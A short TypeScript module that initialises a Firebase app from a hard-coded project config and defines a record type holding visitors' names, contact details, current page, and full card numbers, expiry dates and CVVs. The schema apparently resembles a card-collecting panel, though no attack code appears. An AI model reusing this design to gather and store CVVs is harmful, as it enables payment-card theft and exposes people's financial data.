import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
    apiKey: "AIzaSyCiUtj40_rT0YGBOjNSNJLOXKS8UBMEDwk",
  authDomain: "myapp-61934.firebaseapp.com",
  databaseURL: "https://myapp-61934-default-rtdb.firebaseio.com",
  projectId: "myapp-61934",
  storageBucket: "myapp-61934.appspot.com",
  messagingSenderId: "528867260136",
  appId: "1:528867260136:web:65ba88dc9b1ea30719bb5d",
  measurementId: "G-31QCFJ1EFP"
  };

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
